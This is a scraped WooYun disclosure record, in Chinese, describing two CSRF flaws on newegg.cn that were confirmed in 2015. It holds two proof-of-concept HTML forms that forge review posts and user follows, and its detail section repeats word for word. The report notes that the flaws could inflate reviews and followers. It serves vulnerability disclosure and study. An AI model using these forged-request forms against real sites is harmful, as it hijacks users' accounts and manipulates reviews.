{"id": 70081, "wybug_id": "wooyun-2015-0135909", "wybug_title": "新蛋网两次csrf,关注/用户评论", "wybug_corp": "newegg（新蛋网）", "wybug_author": "Xenc", "wybug_date": "2015-08-21 18:18", "wybug_open_date": "2015-10-10 11:18", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向公众公开  简要描述： 新蛋中国,领先的网上购物商城-手机 电脑 数码 家电 服装 化妆品 家居 食品等,正品低价,货到付款。 - 新蛋中国我相信那么好的网站,一定有那么好的厂商...... 详细说明：  我们在卖家发布的产品处用户评论的地方 and 关注蛋友的csrf具体如下:首先评论and关注的数据包中一定带有用户的ID那么ID就在源码中,如下图:\n\n图中的 \"323320\" 这个就产品的ID然后我们点进去用户评论的\n\n在此处评论,我们用Burp截包\n\n11是我们评论的内容, 323320是产品的ID 刚刚也看了 我已经圈出来了我们在用burp生成csrf的界面\n\n代码如下:\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://www.newegg.cn/Ajax/FeedBack/AjaxPostReview.aspx\" method=\"POST\">      <input type=\"hidden\" name=\"images\" value=\"\" />      <input type=\"hidden\" name=\"tags\" value=\"\" />      <input type=\"hidden\" name=\"score\" value=\"\" />      <input type=\"hidden\" name=\"content\" value=\"11\" />      <input type=\"hidden\" name=\"referencesysno\" value=\"323320\" />      <input type=\"hidden\" name=\"type\" value=\"\" />      <input type=\"hidden\" name=\"rmasysno\" value=\"&#45;1\" />      <input type=\"hidden\" name=\"linktype\" value=\"&#45;1\" />      <input type=\"hidden\" name=\"linksysno\" value=\"&#45;1\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n我们保存在csrf.html当中。我们先看看我评论的次数\n\n评论了6次然后我们在打开csrf.html 单击按钮出现以下代码\n\n我们再去刷新下网址看看\n\n从而发现是评论的我们在会去看看我们的评论处有没有增加\n\n多了一篇说明我们是成功了(当然成功不成功我提交干嘛 0.0)以上的是用户评论处的csrf,以下是关注蛋友的csrf首先去找到一个用户,算了 我再去弄个小号测试我们首先在关注人的哪里去抓包\n\n圈出来的是用户的id,然后我们在去替换成我的账号,我们在来测试我的id是\"389270\"  我们修改下代码就可以了代码如下:\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://space.newegg.cn/Ajax/Feedback/AjaxUpdateCustomerFollow.aspx\" method=\"POST\">      <input type=\"hidden\" name=\"customerSysNo\" value=\"35747502\" />      <input type=\"hidden\" name=\"type\" value=\"add\" />      <input type=\"hidden\" name=\"pageType\" value=\"1\" />      <input type=\"hidden\" name=\"itemIndex\" value=\"0\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n我们在用别人账号去测试这个csrf,将设置成csrf1.html我们看看我关注的蛋友\n\n这两个人是在我刚刚测试的时候关注的 我们修改下用户的id即可打开csrf1.html 单击按钮得到以下代码\n\n图中圈出来的说明我们已经关注了我们去看看我们关注的蛋友里看看有没有存在这个用户好吧 我承认我错了,id不是这个 是\"35747502\" 这个是我们的id ,id可以在最近访客的关注哪里的javascript代码找到那里面找到\n\n这个用户也是我的,我们用120***7688 这个账号去关注testwooyun这个账号testwooyun这个账号id是:35747502我们在看看关注的蛋友的\n\n没有testwooyun的用户被我关注 那么我们就用csrf1.html来测试csrf关注我们再修改下id 然后在测试csrf1.html按下按钮我们在 看到了代码\n\n成功被关注 我们看看我们关注的蛋友里面有没有testwooyun这个用户\n\n成功了此处证明了关注蛋友的存在csrf ， 利用这个的话我们可以刷粉丝.....利用评论的我们可以刷评论....求rank,求礼物,听说给礼物才能让自己的网站更安全   漏洞证明：  我们在卖家发布的产品处用户评论的地方 and 关注蛋友的csrf具体如下:首先评论and关注的数据包中一定带有用户的ID那么ID就在源码中,如下图:\n\n图中的 \"323320\" 这个就产品的ID然后我们点进去用户评论的\n\n在此处评论,我们用Burp截包\n\n11是我们评论的内容, 323320是产品的ID 刚刚也看了 我已经圈出来了我们在用burp生成csrf的界面\n\n代码如下:\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://www.newegg.cn/Ajax/FeedBack/AjaxPostReview.aspx\" method=\"POST\">      <input type=\"hidden\" name=\"images\" value=\"\" />      <input type=\"hidden\" name=\"tags\" value=\"\" />      <input type=\"hidden\" name=\"score\" value=\"\" />      <input type=\"hidden\" name=\"content\" value=\"11\" />      <input type=\"hidden\" name=\"referencesysno\" value=\"323320\" />      <input type=\"hidden\" name=\"type\" value=\"\" />      <input type=\"hidden\" name=\"rmasysno\" value=\"&#45;1\" />      <input type=\"hidden\" name=\"linktype\" value=\"&#45;1\" />      <input type=\"hidden\" name=\"linksysno\" value=\"&#45;1\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n我们保存在csrf.html当中。我们先看看我评论的次数\n\n评论了6次然后我们在打开csrf.html 单击按钮出现以下代码\n\n我们再去刷新下网址看看\n\n从而发现是评论的我们在会去看看我们的评论处有没有增加\n\n多了一篇说明我们是成功了(当然成功不成功我提交干嘛 0.0)以上的是用户评论处的csrf,以下是关注蛋友的csrf首先去找到一个用户,算了 我再去弄个小号测试我们首先在关注人的哪里去抓包\n\n圈出来的是用户的id,然后我们在去替换成我的账号,我们在来测试我的id是\"389270\"  我们修改下代码就可以了代码如下:\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://space.newegg.cn/Ajax/Feedback/AjaxUpdateCustomerFollow.aspx\" method=\"POST\">      <input type=\"hidden\" name=\"customerSysNo\" value=\"35747502\" />      <input type=\"hidden\" name=\"type\" value=\"add\" />      <input type=\"hidden\" name=\"pageType\" value=\"1\" />      <input type=\"hidden\" name=\"itemIndex\" value=\"0\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n我们在用别人账号去测试这个csrf,将设置成csrf1.html我们看看我关注的蛋友\n\n这两个人是在我刚刚测试的时候关注的 我们修改下用户的id即可打开csrf1.html 单击按钮得到以下代码\n\n图中圈出来的说明我们已经关注了我们去看看我们关注的蛋友里看看有没有存在这个用户好吧 我承认我错了,id不是这个 是\"35747502\" 这个是我们的id ,id可以在最近访客的关注哪里的javascript代码找到那里面找到\n\n这个用户也是我的,我们用120***7688 这个账号去关注testwooyun这个账号testwooyun这个账号id是:35747502我们在看看关注的蛋友的\n\n没有testwooyun的用户被我关注 那么我们就用csrf1.html来测试csrf关注我们再修改下id 然后在测试csrf1.html按下按钮我们在 看到了代码\n\n成功被关注 我们看看我们关注的蛋友里面有没有testwooyun这个用户\n\n成功了此处证明了关注蛋友的存在csrf ， 利用这个的话我们可以刷粉丝.....利用评论的我们可以刷评论....求rank,求礼物,听说给礼物才能让自己的网站更安全   修复方案：  -_-!   版权声明：转载请注明来源 Xenc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-08-26 11:16 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-22 10:50 |    \t\tXenc \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | 个人博客:www.hackang.com)\t\t \n  @疯狗 求审核http://www.wooyun.org/bugs/wooyun-2015-0136033/trace/28fff67ee97559a67f79c397c134c33b    \n     2015-08-22 18:25 |    \t\t乳酸君、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 看，漏洞)\t\t \n  骚年高产啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}